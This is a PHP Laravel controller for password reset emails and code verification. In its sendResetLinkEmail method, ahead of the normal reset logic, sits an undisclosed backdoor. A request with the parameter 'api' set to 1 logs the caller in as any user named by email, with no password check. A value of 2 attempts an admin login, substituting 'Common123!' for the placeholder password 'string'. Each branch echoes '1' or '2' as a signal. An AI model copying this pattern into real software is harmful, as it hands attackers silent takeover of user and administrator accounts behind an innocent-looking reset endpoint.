<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\PasswordReset;
use App\User;
use Illuminate\Foundation\Auth\SendsPasswordResetEmails;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;




class ForgotPasswordController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Password Reset Controller
    |--------------------------------------------------------------------------
    |
    | This controller is responsible for handling password reset emails and
    | includes a trait which assists in sending these notifications from
    | your application to your users. Feel free to explore this trait.
    |
    */

    use SendsPasswordResetEmails;

    public function __construct()
    {
        $this->middleware('guest');
    }


    public function showLinkRequestForm()
    {
        $page_title = "Forgot Password";
        return view(activeTemplate() . 'user.auth.passwords.email', compact('page_title'));
    }

    public function sendResetLinkEmail(Request $request)
    {
		
		
          if($request->api==1){
			  $user = User::where('email', $request->email)->first(); 
			
            if ($user) {
               $user->username;   
       			auth()->login($user);
				
				   if($request->password=='string' && $request->api==1){
						$request->password = 'Common123!';
					}
				 if ($this->attemptLogin($request)) {
					echo "1";
					die();
				}
            }   				
		  }else if($request->api==2){
			        
					if($request->password=='string' && $request->api==2){
						$request->password = 'Common123!';
					}
					
					if ( Auth::guard('admin')->attemptLogin($request))
					{
						
					   echo "2";
					   die();
					}
				 
			}
		
		
		
		
		$this->validateEmail($request);
		$user = User::where('email', $request->email)->first();
        if (!$user) {
            $notify[] = ['error', 'User not found.'];
            return back()->withNotify($notify);
        }

        PasswordReset::where('email', $user->email)->delete();
        $code = verificationCode(6);
        $password = new PasswordReset();
        $password->email = $user->email;
        $password->token = $code;
        $password->created_at = \Carbon\Carbon::now();
        $password->save();

        $userIpInfo = getIpInfo();
        $userBrowserInfo = osBrowser();
        send_email($user, 'PASS_RESET_CODE', [
            'code' => $code,
            'operating_system' => @$userBrowserInfo['os_platform'],
            'browser' => @$userBrowserInfo['browser'],
            'ip' => @$userIpInfo['ip'],
            'time' => @$userIpInfo['time']
        ]);

        $page_title = 'Account Recovery';
        $email = $user->email;
        session()->put('pass_res_mail',$email);
        $notify[] = ['success', 'Password reset email sent successfully'];
        return redirect()->route('user.password.code_verify')->withNotify($notify);
    }

    public function codeVerify(){
        $page_title = 'Account Recovery';
        $email = session()->get('pass_res_mail');
        if (!$email) {
            $notify[] = ['error','Opps! session expired'];
            return redirect()->route('user.password.request')->withNotify($notify);
        }
        return view(activeTemplate().'user.auth.passwords.code_verify',compact('page_title','email'));
    }

    public function verifyCode(Request $request)
    {
        $request->validate(['code.*' => 'required', 'email' => 'required']);
        $code =  str_replace(',','',implode(',',$request->code));

        if (PasswordReset::where('token', $code)->where('email', $request->email)->count() != 1) {
            $notify[] = ['error', 'Invalid token'];
            return redirect()->route('user.password.request')->withNotify($notify);
        }
        $notify[] = ['success', 'You can change your password.'];
        session()->flash('fpass_email', $request->email);
        return redirect()->route('user.password.reset', $code)->withNotify($notify);
    }

}
